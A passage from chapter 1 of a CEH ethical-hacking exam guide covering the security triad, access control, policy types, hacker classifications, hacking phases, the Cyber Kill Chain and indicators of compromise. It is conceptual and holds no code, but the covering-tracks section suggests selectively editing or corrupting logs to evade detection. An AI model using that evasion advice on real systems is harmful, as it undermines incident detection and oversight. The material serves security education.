which is designed to ensure that only you have access to that particular device or set of
network resources. If another person were to gain your user ID and password, they would
have unauthorized access to resources and could masquerade as you throughout their
session. Although the user ID and password combination is by far the most common
method used to enforce confidentiality, numerous other options are available, including
biometrics and smartcards.

EXAM TIP Be careul with the terms confidentiality and authentication.
Sometimes they are used interchangeably, and i you’re looking or only one,
you may miss the question altogether. For example, a MAC address spoo
(using the MAC address o another machine) is considered an authentication
attack. Authentication is deinitely a major portion o the conidentiality
segment o IT security.

The Stone Left Unturned
Security professionals deal with, and worry about, risk management a lot. We create
and maintain security plans, deal with endless audits, create and monitor ceaseless
reporting to government, and employ bunches of folks just to maintain “quality” as
it applies to the endless amounts of processes and procedures we have to document.
Yet with all this effort, there always seems to be something left out—some stone left
unturned that a bad guy takes advantage of.

Don’t take my word for it; just check the news and the statistics. Seemingly
every day there is a news story about a major data breach somewhere. In the recent
past we’ve seen the U.S. Office of Personnel Management (OPM) lose millions of
PII records to hackers, 145 million eBay user accounts get compromised, and over
70 million JPMorgan Chase home and business records compromised, and the list
goes on and on.

Per a Forbes article on cybersecurity statistics for 2020 and 2021 (https://www
.forbes.com/sites/chuckbrooks/2021/03/02/alarming-cybersecurity-stats-------
what-you-need-to-know-for-2021/?sh=30724d1e58d3), things haven’t gotten any
better. The year 2020 broke all records when it came to data lost in breaches and sheer
numbers of cyberattacks on companies, governments, and individuals. Malware
increased by 358 percent overall and ransomware increased by 435 percent as com-
pared with 2019, and 87 percent of organizations have experienced an attempted
exploit of an already-known, existing vulnerability. There was a new ransomware
victim every 10 seconds in 2020, with one in five Americans being victimized. Sup-
ply chain attacks grew 420 percent, and there were over four million known DDoS
attacks in the first quarter of 2020.

Oh, and in case you wanted a little more to worry about, it’s not just the number
of attacks and attackers growing exponentially that warrant your eternal worry—the

01-ch01.indd 20 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

21

attack surface is growing too. In 2020, it’s estimated that there are approximately
31–35 billion devices connected to the Internet. By 2025, that number increases to
a mind-boggling 75 billion.

All this leads to a couple questions. First, IT security professionals must be
among the most masochistic people on the planet. Why volunteer to do a job
where you know, somewhere along the line, you’re more than likely going to fail
at it and, at the very least, be yelled at over it? Second, if there are so many profes-
sionals doing so much work and breaches still happen, is there something outside
their control that leads to these failures? As it turns out, the answer is “Not always,
but oftentimes YES.”

Sure, there were third-party failures in home-grown web applications to blame,
and of course there were default passwords left on outside-facing machines. There
were also several legitimate attacks that occurred because somebody, somewhere
didn’t take the right security measure to protect data. But, at least for 2020, phish-
ing and social engineering played a large role in many cases, and zero-day attacks
represented a huge segment of the attack vectors. Can security employees be held
accountable for users not paying attention to the endless array of annual security
training shoved down their throats advising them against clicking on e-mail links?
Should your security engineer be called onto the carpet because employees still, still,
just give their passwords to people on the phone or over e-mail when they’re asked
for them? And I’m not even going to touch zero day—if we could predict stuff like
that, we’d all be lottery winners.

Security folks can, and should, be held to account for ignoring due diligence in
implementing security on their networks. If a system gets compromised because we
were lax in providing proper monitoring and oversight, and it leads to corporate-
wide issues, we should be called to account. But can we ever turn over all those
stones during our security efforts across an organization? Even if some of those
stones are based on human nature? I fear the answer is no. Because some of them
won’t budge.

Integrity refers to the methods and actions taken to protect the information from
unauthorized alteration or revision—whether the data is at rest or in transit. In other
words, integrity measures ensure the data sent from the sender arrives at the recipient
with no alteration. For example, imagine a buying agent sending an e-mail to a customer
offering the price of $300. If an attacker somehow has altered the e-mail and changed
the offering price to $3000, the integrity measures have failed, and the transaction will
not occur as intended, if at all. Oftentimes attacks on the integrity of information are
designed to cause embarrassment or legitimate damage to the target.

Integrity in information systems is often ensured through the use of a hash. A hash
function is a one-way mathematical algorithm (such as MD5 and SHA-1) that generates
a specific, fixed-length number (known as a hash value). When a user or system sends
a message, a hash value is also generated to send to the recipient. If even a single bit is

01-ch01.indd 21 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

22

changed during the transmission of the message, instead of showing the same output,
the hash function calculates and displays a greatly different hash value on the recipient
system. Depending on the way the controls within the system are designed, this would
result in either a retransmission of the message or a complete shutdown of the session.

EXAM TIP Bit flipping is one orm o an integrity attack. In bit lipping, the
attacker isn’t interested in learning the entirety o the plain-text message.
Instead, the attacker manipulates bits in the cipher text itsel to generate a
predictable outcome in the plain text once it is decrypted.

Availability is probably the simplest, easiest-to-understand segment of the security
triad, yet it should not be overlooked. It refers to the communications systems and data
being ready for use when legitimate users need them. Many methods are used for avail-
ability, depending on whether the discussion is about a system, a network resource, or the
data itself, but they all attempt to ensure one thing—when the system or data is needed,
it can be accessed by the appropriate personnel.

Attacks against availability almost always fall into the “denial-of-service” realm. Denial-
of-service (DoS) attacks are designed to prevent legitimate users from having access to a
computer resource or service and can take many forms. For example, attackers could
attempt to use all available bandwidth to the network resource, or they may actively
attempt to destroy a user’s authentication method. DoS attacks can also be much simpler
than that—unplugging the power cord is the easiest DoS in history!

NOTE Many in the security ield add other terms to the security triad. I’ve
seen several CEH study guides reer to the term authenticity as one o the
“our elements o security.” It’s not used much outside the certiication realm,
however; the term is most oten used to describe something as “genuine.”
For example, digital signatures can be used to guarantee the authenticity o
the person sending a message. Come test time, this may help.

Access Control Systems
While we’re on the subject of computer security, I think it may be helpful to step back
and look at how we all got here, and take a brief jog through some of the standards and
terms that came out of all of it. In the early days of computing and networking, it’s
pretty safe to say security wasn’t high on anyone’s to-do list. As a matter of fact, in most
instances security wasn’t even an afterthought, and unfortunately it wasn’t until things
started getting out of hand that anyone really started putting any effort into security. The
sad truth about a lot of security is that it came out of a reactionary stance, and very little
thought was put into it as a proactive effort—until relatively recently, anyway.

This is not to say nobody tried at all. As a matter of fact, in 1983 some smart guys
at the U.S. Department of Defense (DoD) saw the future need for protection of infor-
mation (government information, that is) and worked with the U.S. National Security
Agency (NSA) to create the National Computer Security Center (NCSC). This group

01-ch01.indd 22 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

23

got together and created a variety of security manuals and steps, and published them in a
book series known as the “Rainbow Series.” The centerpiece of this effort came out as the
“Orange Book,” which held something known as the Trusted Computer System Evalua-
tion Criteria (TCSEC).

TCSEC was a DoD standard, with a goal to set basic requirements for testing the
effectiveness of computer security controls built into a computer system. The idea was
simple: if your computer system (network) was going to handle classified information,
it needed to comply with basic security settings. TCSEC defined how to assess whether
these controls were in place, and how well they worked. The settings, evaluations, and
notices in the Orange Book (for their time) were well thought out and proved their
worth in the test of time, surviving all the way up to 2005. However, as anyone in secu-
rity can tell you, nothing lasts forever.

TCSEC eventually gave way to the Common Criteria for Information Technology Secu-
rity Evaluation (commonly known as Common Criteria, or CC). Common Criteria had
actually been around since 1999, and finally took precedence in 2005. It provided a
way for vendors to make claims about their in-place security by following a set standard
of controls and testing methods, resulting in something called an Evaluation Assurance
Level (EAL). For example, a vendor might create a tool, application, or computer system
and desire to make a security declaration. They would then follow the controls and test-
ing procedures to have their system tested at the EAL (Levels 1–7) they wished to have.
Assuming the test was successful, the vendor could claim, for example, “Successfully
tested at EAL-4.”

Common Criteria is, basically, a testing standard designed to reduce or remove vulner-
abilities from a product before it is released. Besides EAL, three other terms are associated
with this effort that you’ll need to remember:

• Target of evaluation (TOE) What is being tested

• Security target (ST) The documentation describing the TOE and security
requirements

• Protection profile (PP) A set of security requirements specifically for the type
of product being tested

While there’s a whole lot more to it, suffice it to say CC was designed to provide an
assurance that the system is designed, implemented, and tested according to a specific
security level. It’s used as the basis for government certifications and is usually tested for
U.S. government agencies.

Lastly in our jaunt through terminology and history regarding security and testing,
we have a couple terms to deal with. One of these is the overall concept of access control
itself. Access control basically means restricting access to a resource in some selective man-
ner. There are numerous terms you can fling about in discussing this to make you sound
really intelligent (subject, initiator, authorization, and so on), but I’ll leave all that for
the glossary. Here, we’ll just talk about a couple of ways of implementing access control:
mandatory and discretionary.

01-ch01.indd 23 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

24

Mandatory access control (MAC) is a method of access control where security policy
is controlled by a security administrator: users can’t set access controls themselves. In
MAC, the operating system restricts the ability of an entity to access a resource (or to
perform some sort of task within the system). For example, an entity (such as a process)
might attempt to access or alter an object (such as files, TCP or UDP ports, and so on).
When this occurs, a set of security attributes (set by the policy administrator) is examined
by an authorization rule. If the appropriate attributes are in place, the action is allowed.

By contrast, discretionary access control (DAC) puts a lot of this power in the hands
of the users themselves. DAC allows users to set access controls on the resources they
own or control. Defined by the TCSEC as a means of “restricting access to objects based
on the identity of subjects and/or groups to which they belong,” the idea is controls are
discretionary in the sense that a subject with a certain access permission is capable of
passing that permission (perhaps indirectly) on to any other subject (unless restrained by
mandatory access control). A couple of examples of DAC include NTFS permissions in
Windows machines and Unix’s use of users, groups, and read-write-execute permissions.

EXAM TIP You won’t see many questions concerning Common Criteria or
access control mechanisms on your exam, but I can guarantee you’ll see at
least a couple. Pay attention to the our parts o Common Criteria (EAL, TOE,
ST, and PP) and speciic examples o access control.

Security Policies
When I saw that EC-Council is dedicating so much real estate in its writing to security
policies, I groaned in agony. Any real practitioner of security will tell you policy is a great
thing, worthy of all the time, effort, sweat, cursing, and mind-numbing days staring at
a template, if only you could get anyone to pay attention to it. Security policy (when
done correctly) can and should be the foundation of a good security function within your
business. Unfortunately, it can also turn into a horrendous amount of memorization and
angst for certification test takers because it’s not always clear.

A security policy can be defined as a document describing the security controls imple-
mented in a business to accomplish a goal. Perhaps an even better way of putting it
would be to say the security policy defines exactly what your business believes is the best
way to secure its resources. Different policies address a variety of issues, such as defining
user behavior within and outside the system, preventing unauthorized access or manipu-
lation of resources, defining user rights, preventing disclosure of sensitive information,
and addressing legal liability for users and partners. There are worlds of different security
policy types, with some of the more common ones identified here:

• Access control policy Identifies the resources that need protection and the
rules in place to control access to those resources.

• Information security policy Identifies to employees what company systems
may be used for, what they cannot be used for, and what the consequences are for
breaking the rules. Generally employees are required to sign a copy before accessing
resources. Versions of this policy are also known as an acceptable use policy.

01-ch01.indd 24 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

25

• Information protection policy Defines information sensitivity levels and who
has access to those levels. It also addresses how data is stored, transmitted, and
destroyed.

• Password policy Defines everything imaginable about passwords within the
organization, including length, complexity, maximum and minimum age, and reuse.

• E-mail policy Sometimes also called the e-mail security policy, addresses the
proper use of the company e-mail system.

• Information audit policy Defines the framework for auditing security within the
organization. When, where, how, how often, and sometimes even who conducts
information security audits are described here.

There are many other types of security policies, and we could go on and on, but you
get the idea. Most policies are fairly easy to understand simply based on the name. For
example, it shouldn’t be hard to determine that the remote access policy identifies who
can have remote access to the system and how they go about getting that access. Other
easy-to-recognize policies include user account, firewall management, network connec-
tion, and special access policies.

Lastly, and I wince in including this because I can hear you guys in the real world
grumbling already, but believe it or not, EC-Council also looks at policy through the
prism of how tough it is on users. A promiscuous policy is basically wide open, whereas
a permissive policy blocks only things that are known to be dangerous. The next step up
is a prudent policy, which provides maximum security but allows some potentially and
known dangerous services because of business needs. Finally, a paranoid policy locks
everything down, not even allowing the user to open so much as an Internet browser.

EXAM TIP In this discussion there are our other terms worth committing
to memory. Standards are mandatory rules used to achieve consistency.
Baselines provide the minimum security level necessary. Guidelines are
lexible, recommended actions users are to take in the event there is
no standard to ollow. And, inally, procedures are detailed step-by-step
instructions or accomplishing a task or goal.

Introduction to Ethical Hacking
Ask most people to define the term hacker, and they’ll instantly picture a darkened room,
several monitors ablaze with green text scrolling across the screen, and a shady character
in the corner furiously typing away on a keyboard in an effort to break or steal something.
Unfortunately, a lot of that is true, and a lot of people worldwide actively participate in
these activities for that very purpose. However, it’s important to realize there are differ-
ences between the good guys and the bad guys in this realm. It’s the goal of this section
to help define the two groups for you, as well as provide some background on the basics.

Whether for noble or bad purposes, the art of hacking remains the same. Using a
specialized set of tools, techniques, knowledge, and skills to bypass computer security

01-ch01.indd 25 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

26

measures allows someone to “hack” into a computer or network. The purpose behind
their use of these tools and techniques is really the only thing in question. Whereas some
hackers use these tools and techniques for personal gain or profit, the good guys practice
using the tools and techniques to better defend their systems and, in the process, provide
insight on how to catch the bad guys.

Hacking Terminology
Like any other career field, hacking (ethical hacking) has its own lingo and a myriad of
terms to know. Hackers themselves, for instance, have various associated terms and clas-
sifications. For example, you may already know that a script kiddie is a person uneducated
in hacking techniques who simply makes use of freely available (but oftentimes old and
outdated) tools and techniques on the Internet. And you probably already know that a
phreaker is someone who manipulates telecommunications systems in order to make free
calls. But there may be a few terms you’re unfamiliar with that this section may be able
to help with. Maybe you simply need a reference point for test study, or maybe this is all
new to you; either way, perhaps there will be a nugget or two here to help on the exam.

In an attempt to avoid a 100-page chapter of endless definitions and to attempt to
assist you in maintaining your sanity in studying for this exam, we’ll stick with the more
pertinent information you’ll need to remember, and I recommend you peruse the glos-
sary at the end of this book for more information. You’ll see these terms used throughout
the book anyway, and most of them are fairly easy to figure out on your own, but don’t
discount the definitions you’ll find in the glossary. Besides, I worked really hard on the
glossary—it would be a shame if it went unnoticed.

EXAM TIP Deinition questions should be no-brainers on the exam. Learn
the hacker types, the stages o a hack, and other deinitions in the chapter—
don’t miss the easy ones.

Hacker Classifications: The Hats
You can categorize a hacker in countless ways, but the “hat” system seems to have stood
the test of time. I don’t know if that’s because hackers like Western movies or we’re all
just fascinated with cowboy fashion, but the hat system is definitely something you’ll see
over and over again on your exam. The hacking community in general can be categorized
into three separate classifications: the good, the bad, and the undecided. In the world of
IT security, this designation is given as a hat color and should be fairly easy for you to
keep track of.

• White hats Considered the good guys, these are the ethical hackers, typically
hired by a customer for the specific goal of testing and improving security or
for other defensive purposes. White hats are well respected and don’t use their
knowledge and skills without prior consent. White hats are also known as
security analysts.

01-ch01.indd 26 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

27

• Black hats Considered the bad guys, these are the crackers, illegally using their
skills for either personal gain or malicious intent. They seek to steal (copy) or
destroy data and to deny access to resources and systems. Black hats do not ask
for permission or consent.

• Gray hats The hardest group to categorize, these hackers are neither good nor
bad. Generally, there are two subsets of gray hats—those who are simply curious
about hacking tools and techniques and those who feel like it’s their duty, with
or without customer permission, to demonstrate security flaws in systems. In
either case, hacking without a customer’s explicit permission and direction is
usually a crime.

NOTE Lots o well-meaning hacker types have ound employment in the
security ield by hacking into a system and then inorming the victim o
the security laws so that they can be ixed. However, many more have
ound their way to prison attempting the same thing. Regardless o your
intentions, do not practice hacking techniques without approval. You may
think your hat is gray, but I guarantee the victim sees only black.

While we’re on the subject, another subset of this community uses its skills and talents
to put forward a cause or a political agenda. These people hack servers, deface websites,
create viruses, and generally wreak all sorts of havoc in cyberspace under the assumption
that their actions will force some societal change or shed light on something they feel
to be a political injustice. It’s not some new anomaly in human nature—people have
been protesting issues since the dawn of time—it has just moved from picket signs and
marches to bits and bytes. In general, regardless of the intentions, acts of “hacktivism”
are usually illegal in nature.

Another class of hacker borders on the insane. Some hackers are so driven, so intent
on completing their task, they are willing to risk everything to pull it off. Whereas
we, as ethical hackers, won’t touch anything until we’re given express consent to do
so, these hackers are much like hacktivists and feel that their reason for hacking out-
weighs any potential punishment. Even willing to risk jail time for their activities,
so-called suicide hackers are the truly scary monsters in the closet. These guys work in
a scorched-earth mentality and do not care about their own safety or freedom, not to
mention anyone else’s.

EXAM TIP ECC loves adding more deinitions to the mix to conuse the issue.
Here are a ew other ones to remember: script kiddie (unskilled, using others’
scripts and tools), cyberterrorist (motivated by religious or political belies to
create ear and large-scale systems disruption), and state-sponsored hacker
(employed by a government).

01-ch01.indd 27 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

28

Attack Types
Another area for memorization in our stroll through this introduction concerns the vari-
ous types of attacks a hacker could attempt. Most of these are fairly easy to identify and
seem, at times, fairly silly to even categorize. After all, do you care what the attack type
is called if it works for you? For this exam, EC-Council broadly defines all these attack
types in four categories:

• Operating system (OS) attacks Generally, these attacks target the common
mistake many people make when installing operating systems—accepting and
leaving all the defaults. Administrator accounts with no passwords, all ports left
open, and guest accounts (the list could go on forever) are examples of settings the
installer may forget about. Additionally, operating systems are never released fully
secure—they can’t be, if you ever plan on releasing them within a time frame of
actual use—so the potential for an old vulnerability in newly installed operating
systems is always a plus for the ethical hacker.

• Application-level attacks These are attacks on the actual programming
code and software logic of an application. Although most people are cognizant
of securing their OS and network, it’s amazing how often they discount the
applications running on their OS and network. Many applications on a network
aren’t tested for vulnerabilities as part of their creation and, as such, have many
vulnerabilities built into them. Applications on a network are a gold mine for
most hackers.

• Shrink-wrap code attacks These attacks take advantage of the built-in code
and scripts most off-the-shelf applications come with. The old refrain “Why
reinvent the wheel?” is often used to describe this attack type. Why spend
time writing code to attack something when you can buy it already “shrink-
wrapped”? These scripts and code pieces are designed to make installation and
administration easier but can lead to vulnerabilities if not managed appropriately.

• Misconfiguration attacks These attacks take advantage of systems that are,
on purpose or by accident, not configured appropriately for security. Remember
the triangle shown earlier (Figure 1-5) and the old maxim “As security increases,
ease of use and functionality decrease”? This type of attack takes advantage of the
administrator who simply wants to make things as easy as possible for the users.
Perhaps to do so, the admin will leave security settings at the lowest possible
level, enable every service, and open all firewall ports. It’s easier for the users but
creates another gold mine for the hacker.

EXAM TIP Inowar (as ECC loves to call it) is the use o oensive and deensive
techniques to create advantage over your adversary. Deining which actions
are oensive versus deensive in nature should be sel-explanatory, so i
you’re asked, use common sense and reasoning. For example, a banner on
your system warning that those attempting access will be prosecuted is
deensive in nature, acting as a deterrent.

01-ch01.indd 28 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

29

Hacking Phases
Regardless of the intent of the attacker (remember there are good guys and bad guys),
hacking and attacking systems can sometimes be akin to a pilot and her plane. My daugh-
ter is a helicopter pilot for the U.S. Air Force, and because of this ultra-cool access, I get
to talk with pilots from time to time. I often hear them say, when describing a mission
or event they were on, that they just “felt” the plane or helicopter—that they just knew
how it was feeling and the best thing to do to accomplish the goal, sometimes without
even thinking about it.

I was talking to my daughter a while back and asked her about this human–machine
relationship. She paused for a moment and told me that, sure, it exists, and it’s uncanny
to think about why pilot A did action B in a split-second decision. However, she cau-
tioned, all that mystical stuff can never happen without all the up-front training, time,
and procedures. Because the pilots followed a procedure and took their time up front, the
decision-making and “feel” of the machine gets to come to fruition.

Hacking phases, as identified by EC-Council, are a great way to think about an attack
structure for you, my hacking pilot trainee. I’m not saying you shouldn’t take advantage
of opportunities when they present themselves just because they’re out of order in the
hacking sequence (if a machine presents itself willingly and you refuse the attack, exclaim-
ing, “But I haven’t reconned it yet!” I may have to deny your pilot wings), but in general
following the plan will produce quality results. Although there are many different terms
for these phases and some of them run concurrently and continuously throughout a test,
EC-Council has defined the standard hack as having five phases, shown in Figure 1-7.
Whether the attacker is ethical or malicious, these five phases capture the full breadth of
the attack.

EXAM TIP Keep the phases o hacking in mind throughout your study. You’ll
most likely see several questions asking you to identiy not only what occurs
in each step but which tools are used in each one.

Figure 1-7 Reconnaissance
Phases o ethical
hacking

Scanning and enumeration

Gaining access

Escalation of privileges

Maintaining access

Covering tracks

01-ch01.indd 29 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

30

Reconnaissance is probably going to be the most difficult phase to understand for the
exam, mainly because many people confuse some of its steps as being part of the next
phase (scanning and enumeration). Reconnaissance is nothing more than the steps taken
to gather evidence and information on the targets you want to attack. It can be passive or
active in nature. Passive reconnaissance involves gathering information about your target
without their knowledge, whereas active reconnaissance uses tools and techniques that
may or may not be discovered but put your activities as a hacker at more risk of discov-
ery. Another way of thinking about it is from a network perspective: active is that which
purposefully puts packets, or specific communications, on a wire to your target, whereas
passive does not.

For example, imagine your penetration test, also known as a pen test, has just started
and you know nothing about the company you are targeting. Passively, you may simply
watch the outside of the building for a couple of days to learn employee habits and see
what physical security measures are in place. Actively, you may simply walk up to the
entrance or guard shack and try to open the door (or gate). In either case, you’re learn-
ing valuable information, but with passive reconnaissance you aren’t taking any action to
signify to others that you’re watching. Examples of actions that might be taken during
this phase are social engineering, dumpster diving, and network sniffing—all of which
are addressed throughout the remainder of this exam study guide.

NOTE Every pen tester on the planet who’s been knee-deep in a dumpster
with a guard’s lashlight in their ace knows that dumpster diving is about
as passive an activity as participating in a marathon. Just keep in mind that
sometimes deinitions and reality don’t match up. For your exam, it’s passive.
In real lie, it’s a big risk, and you’ll probably get stinky.

In the second phase, scanning and enumeration, security professionals take the infor-
mation they gathered in recon and actively apply tools and techniques to gather more
in-depth information on the targets. This can be something as simple as running a ping
sweep or a network mapper to see what systems are on the network, or as complex as
running a vulnerability scanner to determine which ports may be open on a particular
system. For example, whereas recon may have shown the network to have 500 or so
machines connected to a single subnet inside a building, scanning and enumeration
would tell you which ones are Windows machines and which ones are running FTP.

The third phase, as they say, is where the magic happens. This is the phase most
people delightedly rub their hands together over, reveling in the glee they know they
will receive from bypassing a security control. In the gaining access phase, true attacks
are leveled against the targets enumerated in the second phase. These attacks can be as
simple as accessing an open and nonsecured wireless access point and then manipulating
it for whatever purpose, or as complex as writing and delivering a buffer overflow or SQL
injection against a web application. The attacks and techniques used in this phase will be
discussed throughout the remainder of this study guide.

In the fourth phase, maintaining access, hackers attempt to ensure they have a way
back into the machine or system they’ve already compromised. Back doors are left open

01-ch01.indd 30 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

31

by the attacker for future use, especially if the system in question has been turned into
a zombie (a machine used to launch further attacks from) or if the system is used for
further information gathering—for example, a sniffer can be placed on a compromised
machine to watch traffic on a specific subnet. Access can be maintained through the use
of Trojans, rootkits, or any number of other methods.

NOTE There’s an important distinction I’ve mentioned beore and will
mention over and over again through this book: ECC course materials or
the CEH exam otentimes have as much to do with the real world and true
hacking as nuclear usion has to do with doughnut glaze. For example, in the
real world, pen testers and hackers only carry out scanning and enumeration
when the possibility o gaining useul intelligence is greater than the risk
o detection or reaction by the target. Sure, you need as much inormation
as you can get up ront, but i what you’re doing winds up drawing
unnecessary attention to yoursel, the whole thing is pointless. Same thing
goes or privilege escalation: i you can get done what you want or need to
without bothering to escalate to root privilege, huzzah!

In the final phase, covering tracks, attackers attempt to conceal their success and avoid
detection by security professionals. Steps taken here consist of removing or altering log
files, hiding files with hidden attributes or directories, and even using tunneling proto-
cols to communicate with the system. If auditing is turned on and monitored, and often
it is not, log files are an indicator of attacks on a machine. Clearing the log file completely
is just as big an indicator to the security administrator watching the machine, so some-
times selective editing is your best bet.

Another great method to use here is simply corrupting the log file itself—whereas a
completely empty log file screams an attack is in progress, files get corrupted all the time,
and, chances are, the administrator won’t bother trying to rebuild the log file. In either
case, be really careful when it comes to corrupting or deleting logs in the real world. As a
pen tester you may be bound by a “no harm” clause, which will prevent you from altering
the log files at all. Not only would that cause harm to the organization but it may also
prevent it from discovering real bad guys who may be attacking during your test. Good
pen testers are truly defined in this phase, and “do no harm” should be in the forefront
of your mind when attempting this.

EXAM TIP An acronym you should deinitely get acquainted with is SIEM
(which stands or security incident and event management). A SIEM helps
to perorm unctions related to a Security Operations Center (SOC), such
as identiying, monitoring, recording, auditing, and analyzing security
incidents. While the term SIEM can be associated with an overall enterprise
eort (made up o people, applications, processes, and so on), in the real
world otentimes it is used to reer to a speciic application. Splunk, or
example, is oten reerred to as a SIEM.

01-ch01.indd 31 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

32

A couple of insights can, and should, be gained here. First, contrary to popular belief,
pen testers do not usually just randomly assault targets hoping to find some overlooked
vulnerability to exploit. Instead, they follow a specific, organized method to thoroughly
discover every aspect of the system they’re targeting. Good ethical hackers performing
pen tests ensure these steps are very well documented, taking exceptional and detailed
notes and keeping items such as screenshots and log files for inclusion in the final report.
Mr. Horton, our beloved technical editor, put it this way: “Pen testers are thorough in
their work for the customer. Hackers just discover what is necessary to accomplish their
goal.” Second, keep in mind that security professionals performing a pen test do not nor-
mally repair or patch any security vulnerabilities they find—it’s simply not their job to do
so. The ethical hacker’s job is to discover security flaws for the customer, not to fix them.
Knowing how to blow up a bridge doesn’t make you a civil engineer capable of building
one, so while your friendly neighborhood CEH may be able to find your problems, it in
no way guarantees he or she could engineer a secure system.

NOTE A hacker who is ater someone in particular may not bother sticking
to a set method in getting to what is wanted. Hackers in the real world take
advantage o the easiest, quickest, simplest path to the end goal, and i that
means attacking beore enumerating, then so be it.

The Cyber Kill Chain
Lastly in our romp through terminology and methodology, we need to spend a few
moments on a relatively new entry to the study lexicon: the Cyber Kill Chain methodol-
ogy (https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html).
The idea behind this methodology is very simple, and mirrors what you are trying to
do yourself: think like the bad guy. From the site, “Developed by Lockheed Martin,
the Cyber Kill Chain® framework is part of the Intelligence Driven Defense® model for
identification and prevention of cyber intrusions activity. The model identifies what the
adversaries must complete in order to achieve their objective.” Knowing the steps taken
and what adversaries might be thinking can help in setting a security response. This
methodology consists of seven phases, shown in Figure 1-8.

NOTE Another term used in this realm is “adversary behavioral identiication,”
and it reers to identiying common methods used by a particular attacker. A
speciic attacker may, or example, be identiied by unique use o PowerShell
or the command-line interace. Or perhaps he may be ond o DNS tunneling,
or using a web shell, or proxies, or _insert-tactic-here_. Building a proile isn’t
just or the detectives on TV; it’s now your job too.

As an aside, the idea behind thinking like the bad guy is to help anticipate what they’d
go after, how they might do that, and even when they might. Just as FBI profilers do with
serial murderers and bomb experts do with the fragments recovered at a scene, we can do
a better job of anticipating the bad guys by noting specific patterns of behavior, activi-
ties, and methods they use. Each person is different, after all, and repeating the steps you

01-ch01.indd 32 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

33

Figure 1-8
Lockheed

1 Reconnaissance
Martin’s Cyber
Kill Chain

Weaponization 2

3 Delivery

Exploitation 4

5 Installation

Command and Control (C2) 6

Actions on Objectives
7

already know provides a fingerprint of sorts to your hacking. These fingerprints, these
patterns of actions, are known as tactics, techniques, and procedures (TTPs).

EXAM TIP The dierence in deining a tactic versus a technique is vague,
at best. The best I can ind is a tactic is a “way,” while the technique is the
“technical method” used. The oicial courseware itsel doesn’t seem to know
the dierence between the two, so just use best judgement on the exam
should you see it.

Finally, a term you’ll definitely come across is indicator of compromise (IOC). IOCs are
basically clues—identifiers, tidbits of information or settings, and so on—that you can
readily identify as a strong symptom you’ve been hacked. IOCs can be categorized into
four main types:

• E-mail indicators Items such as specific senders’ addresses, subject lines, and
types of attachments

• Network indicators Include URLs, domain names, and IP addresses

• Host-based indicators Items such as specific filenames, hashes, and registry keys

• Behavioral indicators Specific behaviors indicative of an ongoing attack, such
as PowerShell executions, remote command executions, and so forth

01-ch01.indd 33 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

34

EXAM TIP E-mail, network, and host-based indicators, as deined by
EC-Council, seem to be more…tangible…in nature than behavioral ones.
For example, network traic at 02:00 every day or a week might be an
indicator, but could all more into the behavior realm than the network
one. Just stick with the deinitions listed here and you should be ine.

The Ethical Hacker
So, what makes someone an “ethical” hacker? Can such a thing even exist? Considering
the art of hacking computers and systems is, in and of itself, a covert action, most people
might believe the thought of engaging in a near-illegal activity to be significantly unethi-
cal. However, the purpose and intention of the act have to be taken into account.

For comparison’s sake, law enforcement professionals routinely take part in unethi-
cal behaviors and situations in order to better understand, and to catch, their criminal
counterparts. Police and FBI agents must learn the lingo, actions, and behaviors of drug
cartels and organized crime in order to infiltrate and bust the criminals, and doing so
sometimes forces them to engage in criminal acts themselves. Ethical hacking can be
thought of in much the same way. To find and fix the vulnerabilities and security holes in
a computer system or network, you sometimes have to think like a criminal and use the
same tactics, tools, and processes they might employ.

In CEH parlance, and as defined by several other entities, there is a distinct difference
between a hacker and a cracker. An ethical hacker is someone who employs the same tools
and techniques a criminal might use, with the customer’s full support, approval, and writ-
ten consent to help secure a network or system. A cracker, also known as a malicious hacker,
uses those skills, tools, and techniques either for personal gain or destructive purposes or,
in purely technical terms, to achieve a goal outside the interest of the system owner. Ethical
hackers are employed by customers to improve security. Crackers either act on their own or,
in some cases, act as hired agents to destroy or damage government or corporate reputation.

One all-important specific identifying a hacker as ethical versus the bad-guy crackers
needs to be highlighted and repeated over and over again. Ethical hackers work within
the confines of an agreement made between themselves and a customer before any action is
taken. This agreement isn’t simply a smile, a conversation, and a handshake just before you
